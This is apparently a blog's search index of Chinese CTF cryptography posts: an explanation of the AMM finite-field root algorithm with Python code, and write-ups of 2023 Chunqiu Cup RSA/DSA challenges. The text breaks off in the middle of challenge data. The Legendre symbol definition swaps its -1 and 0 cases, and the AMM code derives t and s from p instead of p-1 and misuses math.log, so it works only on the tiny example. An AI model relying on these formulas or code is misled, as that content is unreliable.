<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>RSA的AMM算法</title>
      <link href="/2024/01/29/rsa-zhong-de-amm-suan-fa/"/>
      <url>/2024/01/29/rsa-zhong-de-amm-suan-fa/</url>
      
        <content type="html"><![CDATA[<p>之前在RSA题目中遇到过的和phi不互素的问题，可以采用AMM开根算法来解决这个问题，来了解有限域上的AMM开根算法。</p><p>放一篇论文压一压：<a href="https://arxiv.org/pdf/1111.4877.pdf">1111.4877.pdf (arxiv.org)</a></p><h1 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h1><p>若$p$为素数，$gcd(a,p)=1$，则$a^{p-1}\equiv 1\;(mod\;p)$。</p><p>另一个形式：对于任意整数$a$，有$a^p\equiv a\;(mod\;p)$。</p><h1 id="二次剩余（Quadraticresidue）"><a href="#二次剩余（Quadraticresidue）" class="headerlink" title="二次剩余（Quadraticresidue）"></a>二次剩余（Quadraticresidue）</h1><p>通俗来说，二次剩余可以认为是<strong>在取模意义下的开平方</strong>，即满足方程$x^2\equiv a(mod\;p)$的$x$的值。</p><ul><li>一个数$a$，如果不是$p$的倍数，且模$p$同余于某个数的平方，则称$a$为模$p$的<strong>二次剩余</strong>。</li><li>一个数$b$，如果不是$p$的倍数，且模$p$不同余于任何数的平方，则称$b$为模$p$的<strong>二次非剩余</strong>。</li><li>一个数$c$，是$p$的倍数，那么容易得到$c\equiv 0(mod\;p)$，显然这个方程$x^2 \equiv c$的解仅有$x = 0$了。</li></ul><p>一般这种问题只讨论$p$为奇数的情况</p><h2 id="欧拉准则"><a href="#欧拉准则" class="headerlink" title="欧拉准则"></a>欧拉准则</h2><script type="math/tex; mode=display">(\frac {a}{p}) \equiv a^{\frac {p-1}{2}} (mod p)</script><h2 id="勒让德符号（Legendre-Symbol）"><a href="#勒让德符号（Legendre-Symbol）" class="headerlink" title="勒让德符号（Legendre Symbol）"></a>勒让德符号（Legendre Symbol）</h2><script type="math/tex; mode=display">L(a,p)=\left(\frac ap\right)=\left\{\begin{array}{cl}1,&\mbox{若 } a\mbox{ 是 } p \mbox{ 的二次剩余}\newline -1, &\mbox{若 }a \bmod p = 0\newline 0,&\mbox{若 } a\mbox{ 是 } p \mbox{ 的二次非剩余}\end{array}\right.</script><h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><script type="math/tex; mode=display">\left(\frac{a}{p}\right)=\left(\frac{a\pm b}{p}\right)=\left(\frac{a\;modp}{p}\right)</script><script type="math/tex; mode=display">\left(\frac{ab}{p}\right)=\left(\frac{a}{p}\right)*\left(\frac{b}{p}\right)</script><script type="math/tex; mode=display">\left(\frac {-1}p\right)=\left\{\begin{array}{cl}1,& p \equiv 1 \pmod 4 \newline -1, & p \equiv 3 \pmod 4 \end{array}\right.\left(\frac {-1}p\right)=\left\{\begin{array}{cl}1,& p \equiv 1 \pmod 4 \newline -1, & p \equiv 3 \pmod 4 \end{array}\right.</script><script type="math/tex; mode=display">\left(\frac 2p\right)=\left\{\begin{array}{cl}1,& p \equiv \pm 1 \pmod 8 \newline -1,& p \equiv \pm 3 \pmod 8 \end{array}\right.</script><script type="math/tex; mode=display">\left(\cfrac pq\right)\left(\cfrac qp\right) = (-1)^{\frac{p-1}2{\frac{q-1}2}}</script><script type="math/tex; mode=display">\sum\limits_{x=0}^{p-1}\left(\cfrac{ax+b}p\right)=0,p\nmid a</script><script type="math/tex; mode=display">\sum\limits_{x=0}^{p-1}\left(\cfrac{ax^2+bx+c}p\right) = \left\{\begin{array}{cl}-\left(\cfrac ap\right),& p \nmid b^2-4ac \newline (p-1)\left(\cfrac ap\right), & p \mid b^2-4ac \end{array}\right.</script><h2 id="雅可比符号（Jacobi-Symbol）"><a href="#雅可比符号（Jacobi-Symbol）" class="headerlink" title="雅可比符号（Jacobi Symbol）"></a>雅可比符号（Jacobi Symbol）</h2><script type="math/tex; mode=display">J(a,p) = \left(\cfrac an\right)= \prod\limits_{i=1}^{m} \left(\cfrac a{p_i}\right)^{t_i},n = \prod\limits_{i=1}^{m} p_i^{t_i}</script><h3 id="性质-1"><a href="#性质-1" class="headerlink" title="性质"></a>性质</h3><script type="math/tex; mode=display">\left(\cfrac an\right) = \left(\cfrac {a \pm n}n\right) = \left(\cfrac {a \bmod n}n\right)</script><script type="math/tex; mode=display">\left(\cfrac {ab}n\right) = \left(\cfrac an\right)\left(\cfrac bn\right)</script><script type="math/tex; mode=display">\left(\cfrac {-1}n\right)= (-1)^{\frac{n-1}2}</script><script type="math/tex; mode=display">\left(\cfrac 2n\right)= (-1)^{\frac{n^2-1}8}</script><p>详细性质等参考：<a href="https://zhuanlan.zhihu.com/p/601814241">初等数论(八): 二次剩余 - 知乎 (zhihu.com)</a></p><h1 id="AMM算法"><a href="#AMM算法" class="headerlink" title="AMM算法"></a>AMM算法</h1><script type="math/tex; mode=display">m^e \equiv c\;mod\;p</script><p>p在已知e下易分解得到s</p><script type="math/tex; mode=display">p-1 = e^t * s</script><h2 id="开二次方（e-2）"><a href="#开二次方（e-2）" class="headerlink" title="开二次方（e = 2）"></a>开二次方（e = 2）</h2><p>欧拉准则：</p><script type="math/tex; mode=display">x^{\frac{p-1}{2}} = (x^s)^{e^{t-1}}</script><p>二次剩余x：</p><script type="math/tex; mode=display">(x^s)^{2^{t-1}}\equiv 1\;mod\;p</script><p>二次非剩余y：</p><script type="math/tex; mode=display">(y^s)^{2^{t-1}}\equiv-1\;mod\;p</script><h3 id="若-t-1-："><a href="#若-t-1-：" class="headerlink" title="若$t=1$："></a>若$t=1$：</h3><p>二次剩余的式子左右同时乘$x$，并开方</p><script type="math/tex; mode=display">x^{s+1}\equiv x\;mod\;p</script><script type="math/tex; mode=display">x^{\frac{s+1}{2}}\equiv x^{\frac{1}{2}}\;mod\;p</script><p>由条件$m^2\equiv c\;mod\;p$，代入c</p><script type="math/tex; mode=display">c^{\frac{x+1}{2}}\equiv m\;mod\;p</script><p>即开方结果为</p><script type="math/tex; mode=display">c^{\frac{s+1}{2}}</script><h3 id="若-t-geq2-："><a href="#若-t-geq2-：" class="headerlink" title="若$t\geq2$："></a>若$t\geq2$：</h3><script type="math/tex; mode=display">\left(x^s\right)^{2^{(t-1)}}\equiv 1\;mod\;p</script><p>对上式开根，有以下结果：</p><script type="math/tex; mode=display">\left(x^s\right)^{2^{(t-1)}}\equiv 1\;mod\;p</script><script type="math/tex; mode=display">\left(x^s\right)^{2^{(t-2)}}\equiv 1\;mod\;p</script><script type="math/tex; mode=display">\left(x^s\right)^{2^{(t-2)}}\equiv-1\;mod\;p</script><p>我们不与要负根，所以配上一个二次非剩余</p><script type="math/tex; mode=display">\left(x^s\right)^{2^{(t-2)}}\equiv-1\;mod\;p</script><script type="math/tex; mode=display">\left(y^s\right)^{2^{(t-1)}}\equiv -1\;mod\;p</script><script type="math/tex; mode=display">\left(x^s\right)^{2^{(t-2)}}*(y^s)^{2^{(t-1)}*k}\equiv 1\;mod\;p</script><p>当开出负根$k=1$，开出正根$k=0$，取决于下式：</p><script type="math/tex; mode=display">(x^s)^{2^{(t-i)}}mod\;p</script><p>接下来重复上述操作，直到<strong>不能开二次方</strong>，即2的指数为0。</p><p>总计$t-1$个k</p><script type="math/tex; mode=display">(x^s)*(y^s)^{k_1+2*k_2+......+2^{t-2}*k_{t-1}}\equiv 1\;mod\;p</script><p>然后左右同乘二次剩余x，开平方</p><script type="math/tex; mode=display">x^{\frac{s+1}{2}}*(y^s)^{k_1+2*k_2+......+2^{t-2}*k_{t-1}}\equiv x^{\frac{1}{2}}\;mod\;p</script><p><img src="/2024/01/29/rsa-zhong-de-amm-suan-fa/image-20240129134423094.png" alt="image-20240129134423094"></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">amm2</span>(<span class="params">x,p</span>):</span><br><span class="line">    <span class="comment">#开二次方的代码</span></span><br><span class="line">    <span class="comment">#示例：2^2 = 4 mod 7  7-1 = 2 * 3 </span></span><br><span class="line">    <span class="comment"># 4 ^((3+1)/2) mod 7 = 2</span></span><br><span class="line">    y = random.randint(<span class="number">1</span>, p) </span><br><span class="line">    <span class="comment">#生成二次非剩余</span></span><br><span class="line">    <span class="comment">#while y ** ((p-1) // 2) == 1:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">pow</span>(y, ((p-<span class="number">1</span>) // <span class="number">2</span>), p) == <span class="number">1</span>:</span><br><span class="line">        y = random.randint(<span class="number">1</span>, p)</span><br><span class="line">    <span class="comment">#计算t s </span></span><br><span class="line">    t = <span class="number">1</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> p % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">    s = p // (<span class="number">2</span>**t)</span><br><span class="line">    <span class="comment">#计算a = y^s b = x^s h =1</span></span><br><span class="line">    <span class="comment">#h为二次非剩余部分的积</span></span><br><span class="line">    a = <span class="built_in">pow</span>(y, s, p)</span><br><span class="line">    b = <span class="built_in">pow</span>(x, s, p)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="comment">#判断k值</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,t):</span><br><span class="line">        tmp = <span class="number">2</span>**(t - <span class="number">1</span> - i)</span><br><span class="line">        d = <span class="built_in">pow</span>(b, tmp, p)</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span> :</span><br><span class="line">            k = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k = <span class="number">1</span></span><br><span class="line">        b = b * <span class="built_in">pow</span>(<span class="built_in">pow</span>(a, <span class="number">2</span>, p), k, p)</span><br><span class="line">        h = h * <span class="built_in">pow</span>(a, k, p)</span><br><span class="line">        a = <span class="built_in">pow</span>(a, <span class="number">2</span>, p)</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">pow</span>(x,((s + <span class="number">1</span>) // <span class="number">2</span>),p) * h )% p</span><br><span class="line"><span class="built_in">print</span>(amm2(<span class="number">4</span>,<span class="number">7</span>))</span><br></pre></td></tr></tbody></table></figure><h2 id="开e次方"><a href="#开e次方" class="headerlink" title="开e次方"></a>开e次方</h2><p>我们知道$m^e=c\;mod\;p$肯定有解，e次剩余x等同于c</p><p>由费马小定理得：</p><script type="math/tex; mode=display">x^{\frac{p-1}{e}}=(x^s)^{e^{t-1}}\equiv 1\;mod\;p</script><p>e次非剩余</p><script type="math/tex; mode=display">y^{\frac{p-1}{e}}=(y^s)^{e^{t-1}}=?\;mod\;p</script><p>考虑开e次方，类比开二次方，我们只需要对$x^{s+1}$开e次方即可</p><p>因此，需要找到一个值$\alpha$使得：$e<em>\alpha-1=k</em>s$</p><p>对e次剩余扩展，从$s$扩展到$ks$</p><script type="math/tex; mode=display">(x^{k*s})^{e^{t-1}}=1\;mod\;p</script><script type="math/tex; mode=display">(x^{e*\alpha-1})^{e^{t-1}}=1\;mod\;p</script><p>同理，不断对剩余开e次，但是现在开e次有e种选择,即1的r次根$(1,y_1,y_2…,y_{e-1})$</p><p>我们已知该类元素的e次方都为1，以及费马小定理</p><script type="math/tex; mode=display">(y_e)^e=1\;mod\;p</script><script type="math/tex; mode=display">y^{p-1}=1\;mod\;p</script><p>可以直接构造非二次剩余y的循环群</p><script type="math/tex; mode=display">(y_0,y_1...,y_{e-1})</script><script type="math/tex; mode=display">\{1,(y^{\frac{p-1}{e}})^1,(y^{\frac{p-1}{e}})^2...,(y^{\frac{p-1}{e}})^{e-1}\}</script><script type="math/tex; mode=display">((y^s)^{e^{t-1}})^i</script><p>而对于$i\geq 1$有结论</p><script type="math/tex; mode=display">y_i*y_{e-1}=1</script><p>只需要在每次开e次方的时候补上y即可</p><script type="math/tex; mode=display">x^{(e*\alpha-1)}*(y^s)^{k_1+2*k_2...+2^{t-2}*k_{t-1}}=1\;mod\;p</script><p>同二次k值的获取来自开e次方的结果：</p><script type="math/tex; mode=display">(x^s)^{2^{t-i}}mod\;p</script><p>对上面的值关于y取log即可得到是循环群里的第几个元素再取逆mod e</p><p>最后一步两边乘上x开e次根</p><script type="math/tex; mode=display">(x^{\alpha})*(y^s)^{k_1+2 * k_2 +...+2^{t-2}* k_{t-1}}*x=x^{\frac{1}{e}}\;mod\;p</script><p><img src="/2024/01/29/rsa-zhong-de-amm-suan-fa/image-20240129151621710.png" alt="image-20240129151621710"></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line">p = <span class="number">0</span></span><br><span class="line"><span class="comment">#设置模数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GF</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p = a</span><br><span class="line"><span class="comment">#乘法取模</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">g</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(a,b,p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">x,e,p</span>):</span><br><span class="line">    GF(p)</span><br><span class="line">    y = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> g(y, (p-<span class="number">1</span>)//e) == <span class="number">1</span>:</span><br><span class="line">        y = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(y)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"find"</span>)</span><br><span class="line">    <span class="comment">#p-1 = e^t*s</span></span><br><span class="line">    t = <span class="number">1</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> p % e == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(t)</span><br><span class="line">    s = p // (e**t)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'e'</span>,e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'p'</span>,p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'s'</span>,s)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'t'</span>,t)</span><br><span class="line">    <span class="comment"># s|ralpha-1</span></span><br><span class="line">    k = <span class="number">1</span>    </span><br><span class="line">    <span class="keyword">while</span>((s * k + <span class="number">1</span>) % e != <span class="number">0</span>):</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alpha = (s * k + <span class="number">1</span>) // e</span><br><span class="line">    <span class="comment">#计算a = y^s b = x^s h =1</span></span><br><span class="line">    <span class="comment">#h为e次非剩余部分的积</span></span><br><span class="line">    a = g(y, (e ** (t - <span class="number">1</span>) ) * s)</span><br><span class="line">    b = g(x, e * alpha - <span class="number">1</span>)</span><br><span class="line">    c = g(y, s)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t-<span class="number">1</span>):</span><br><span class="line">        d = g(b,e**(t-<span class="number">1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = (-math.log(d,a) % e)</span><br><span class="line">        b = b * (g(g(c, e), j))</span><br><span class="line">        h = h * g(c, j)</span><br><span class="line">        c = g(c,e)</span><br><span class="line">    <span class="keyword">return</span> (g(x,alpha * h)) % p</span><br><span class="line"><span class="built_in">print</span>(AMM(<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>))</span><br></pre></td></tr></tbody></table></figure><h2 id="求所有的根"><a href="#求所有的根" class="headerlink" title="求所有的根"></a>求所有的根</h2><p>我们已知1的e个根</p><script type="math/tex; mode=display">(y_0,y_1...,y_{e-1})</script><script type="math/tex; mode=display">\{1,(y^{\frac{p-1}{e}})^1,(y^{\frac{p-1}{e}})^2...,(y^{\frac{p-1}{e}})^{e-1}\}</script><script type="math/tex; mode=display">((y^s)^{e^{t-1}})^i</script><p>我们只要用所求的根去乘上这e个元素的值再取模就能得到结果了。</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023春秋杯冬季赛</title>
      <link href="/2024/01/23/2023-chun-qiu-bei-dong-ji-sai/"/>
      <url>/2024/01/23/2023-chun-qiu-bei-dong-ji-sai/</url>
      
        <content type="html"><![CDATA[<p>只解出一个题，签到。。。。赛后复现，学习新知识。</p><p><img src="/2024/01/23/2023-chun-qiu-bei-dong-ji-sai/93de8bb1484e44b3098a46ab470997fd384628005.jpg@!web-article-pic.webp" alt="img"></p><p><del>收到，义父（bushi</del></p><p>ECC学了好久，拖了好久。。。<del>我真该死啊</del></p><h1 id="CF-is-Crypto-Faker"><a href="#CF-is-Crypto-Faker" class="headerlink" title="CF is Crypto Faker"></a>CF is Crypto Faker</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">学过AI的都知道，这题不是“纯密码”，密码假面人要披上AI的战衣，但他永远不会卸下密码的假面。</span><br><span class="line">https://pan.baidu.com/s/1nOe2NlWdCVfES6I1U5RzPg</span><br><span class="line">提取码：GAME</span><br></pre></td></tr></tbody></table></figure><p>附件给了一大堆，有用的没几句.<del>（老奶奶的裹脚布）</del></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">Please firstly pay attention to the file named as "task.py".</span><br><span class="line">The real flag is a little strange.</span><br><span class="line">However, there is no need to be messy in your mind just because of the "appearance" of the flag.</span><br><span class="line">Just be self-confident!</span><br></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> initialize</span><br><span class="line"><span class="keyword">import</span> train</span><br><span class="line"><span class="keyword">import</span> valid</span><br><span class="line"><span class="keyword">import</span> test</span><br><span class="line"><span class="keyword">import</span> rec</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> message, flag_point</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b"flag{"</span> + long_to_bytes(message) + long_to_bytes(flag_point) + <span class="string">b".}"</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"The significant parameter n: %s"</span> % <span class="built_in">hex</span>(n))</span><br><span class="line">phi0 = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">r = rec.rec(p, q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"The unique parameter r: %s"</span> % <span class="built_in">hex</span>(r))</span><br><span class="line"></span><br><span class="line">parameters = initialize.initialize(p, q)</span><br><span class="line">wild_phi = parameters[<span class="number">0</span>]</span><br><span class="line">wild_e = parameters[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"------"</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Parameters are initialized to: \n  phi:%s\n"</span> % <span class="built_in">hex</span>(wild_phi), <span class="string">" e:%s"</span> % <span class="built_in">hex</span>(wild_e))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"But they are wild and crazy!"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"We have to give them a lesson!"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"------"</span>)</span><br><span class="line"></span><br><span class="line">parameters = train.train(wild_phi, wild_e, n, r, phi0)</span><br><span class="line">trained_phi = parameters[<span class="number">0</span>]</span><br><span class="line">trained_e = parameters[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Parameters are trained to: \n  phi:%s\n"</span> % <span class="built_in">hex</span>(trained_phi), <span class="string">" e:%s"</span> % <span class="built_in">hex</span>(trained_e))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"After training, the two naughty parameters are more and more normal."</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"It's closer to your target!"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"------"</span>)</span><br><span class="line"></span><br><span class="line">parameters = valid.valid(trained_phi, trained_e, n)</span><br><span class="line">y_valid = parameters[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"The encrypted output in validation set is %s"</span> % <span class="built_in">hex</span>(y_valid))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"After validation, the model is more and more stable."</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"To test the real flag!"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"------"</span>)</span><br><span class="line"></span><br><span class="line">parameters = test.test(trained_phi, trained_e, n)</span><br><span class="line">y_hat_cipher1 = parameters[<span class="number">0</span>]</span><br><span class="line">y_hat_cipher2 = parameters[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"The final output is \n%s"</span> % <span class="built_in">hex</span>(y_hat_cipher1), <span class="string">"\n%s"</span> % <span class="built_in">hex</span>(y_hat_cipher2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"------"</span>)</span><br></pre></td></tr></tbody></table></figure><p>看起来真的很吓人，但是仔细看看好像啥都没变。。该知道的都给了，直接梭哈。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">phi = <span class="number">0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709b3bb712fdcba325655f111918472d4353a66854ccda50b63a1047278c15a4b39cde898d054db87092958c7c05f8fa566dcd969b1ff4b7d1935c375a4af3bfc341b0</span></span><br><span class="line">e = <span class="number">0x2c22193ad9abcca2f67552fc76dd07b3ef883f3d755c95119cdf82bb6a07c970fd37e582bb49250d8efaa29b8a59c82059165c654206a9d7261f6b45a90dc69</span></span><br><span class="line">c1 = <span class="number">0x29289e3d9275147b885b5061637564cbee3e4d9f48e52694e594f020e49da9b24d9246b2437fb2221fa86ca1a277f3fdd7ab5cad4738a02b66d47703ef816844a84c6c209c8251e8961c9ba2c791649e022627f86932d9700c3b1dc086e8b2747d0a5604955387a935464d3866dd4100b2f3d57603c728761d1d8ef7fdbdcbee</span></span><br><span class="line">c2 = <span class="number">0x2b0059f88454e0e36269c809b5d5b6b28e5bab3c87b20f9e55635239331100a0a582241e7a385034698b61ebf24b519e868617ff67974cc907cc61be38755737f9a6dbeb7890ff55550b1af1ecf635112fcaaa8b07a3972b3c6728cbcf2a3973a4d7bd92affec7e065e0ae83cd36858e6d983785a3668a8b82709d78a69796af</span></span><br><span class="line">n = <span class="number">0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709b3d2698476b6dd203811b6a2ec6a6e2a7e213ab719bcd3ab49bb864b10e9c78ea3f501c0e2213dfe431043bb6f0cc2e8d77bfb43869b843af1a99ae81b87811e101</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c1,d,n)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m1))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m2))</span><br><span class="line">flag = <span class="string">b"flag{"</span> + long_to_bytes(m1) + long_to_bytes(m2) + <span class="string">b".}"</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b"flag{With the method of machine learning, it is available for Crypto-er to develop the modern cryptography.Don't give up learning crypto.}"</span></span><br></pre></td></tr></tbody></table></figure><p>第一次看的时候以为它是一个很难很难的题，我就弃了，后来发现好多解啊，试试？。。</p><h1 id="not-wiener"><a href="#not-wiener" class="headerlink" title="not_wiener"></a>not_wiener</h1><p>比赛期间这个题目做了一点，但是在求a卡住了，boneh_durfee试遍了delta，就是求不出d（<del>wo shi dai bi</del>）</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">https://pan.baidu.com/s/1iPaUBGJ2hvIYruvo-1FV_Q</span><br><span class="line">提取码：GAME</span><br></pre></td></tr></tbody></table></figure><p>以下为附件内容</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line">flag=<span class="string">b''</span></span><br><span class="line">x = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        q = getPrime(<span class="number">160</span>)</span><br><span class="line">        p = <span class="number">2</span> * getPrime(<span class="number">1024</span>-<span class="number">160</span>) * q+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    h = random.randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">    g = powmod(h,(p-<span class="number">1</span>)//q, p)</span><br><span class="line">    y=<span class="built_in">pow</span>(g,x,p)</span><br><span class="line">    <span class="keyword">return</span> p,q,g,y</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cry</span>():</span><br><span class="line">    a =</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    d = getPrime(<span class="number">280</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = inverse(d, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">    c = <span class="built_in">pow</span>(a, e, n)</span><br><span class="line">    <span class="keyword">return</span> n,e,c</span><br><span class="line"></span><br><span class="line">p,q,g,y=gen_key()</span><br><span class="line">k1 = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line">h1 = bytes_to_long(sha1(os.urandom(<span class="number">20</span>)).digest())</span><br><span class="line">r1 = <span class="built_in">pow</span>(g, k1, p) % q</span><br><span class="line">s1 = ((h1 + x*r1) * invert(k1, q))% q</span><br><span class="line"></span><br><span class="line">n,e,c= cry()</span><br><span class="line"></span><br><span class="line">a=</span><br><span class="line">b= <span class="number">17474742587088593627</span></span><br><span class="line">k2 = a*k1 + b</span><br><span class="line">h2 = bytes_to_long(sha1(os.urandom(<span class="number">20</span>)).digest())</span><br><span class="line">r2 = <span class="built_in">pow</span>(g, k2, p) % q</span><br><span class="line">s2 = ((h2 + x*r2) * invert(k2, q)) % q</span><br><span class="line"><span class="built_in">print</span>(n,e,c)</span><br><span class="line"><span class="built_in">print</span>(p,q,g,y)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"h1:%s r1:%s s1:%s"</span>%(h1,r1,s1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"h2:%s r2:%s s2:%s"</span>%(h2,r2,s2))</span><br></pre></td></tr></tbody></table></figure><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">n = 98871082998654651904594468693622517613869880791884929588100914778964766348914919202255397776583412976785216592924335179128220634848871563960167726280836726035489482233158897362166942091133366827965811201438682117312550600943385153640907629347663140487841016782054145413246763816202055243693289693996466579973</span><br><span class="line">e = 76794907644383980853714814867502708655721653834095293468287239735547303515225813724998992623067007382800348003887194379223500764768679311862929538017193078946067634221782978912767213553254272722105803768005680182504500278005295062173004098796746439445343896868825218704046110925243884449608326413259156482881</span><br><span class="line">c = 13847199761503953970544410090850216804358289955503229676987212195445226107828814170983735135692611175621170777484117542057117607579344112008580933900051471041224296342157618857321522682033260246480258856376097987259016643294843196752685340912823459403703609796624411954082410762846356541101561523204985391564</span><br><span class="line"></span><br><span class="line">p= 161310487790785086482919800040790794252181955976860261806376528825054571226885460699399582301663712128659872558133023114896223014064381772944582265101778076462675402208451386747128794418362648706087358197370036248544508513485401475977401111270352593919906650855268709958151310928767086591887892397722958234379</span><br><span class="line">q= 1115861146902610160756777713087325311747309309771</span><br><span class="line">g= 61073566757714587321114447684333928353300944355112378054603585955730395524359123615359185275743626350773632555967063692889668342544616165017003197599818881844811647270423070958521148291118914198811187731689123176313367399492561288350530256722898205674043032421874788802819858438796795768177550638273020791962</span><br><span class="line">y= 23678147495254433946472657196764372220306841739888385605070426528738230369489739339976134564575544246606937803367113623097260181789372915552172469427842482448570540429192377881186772226796452797182435452490307834205012154495575570994963829345053331967442452842152258650027916313982835119514473311305158299360</span><br><span class="line">(h1, 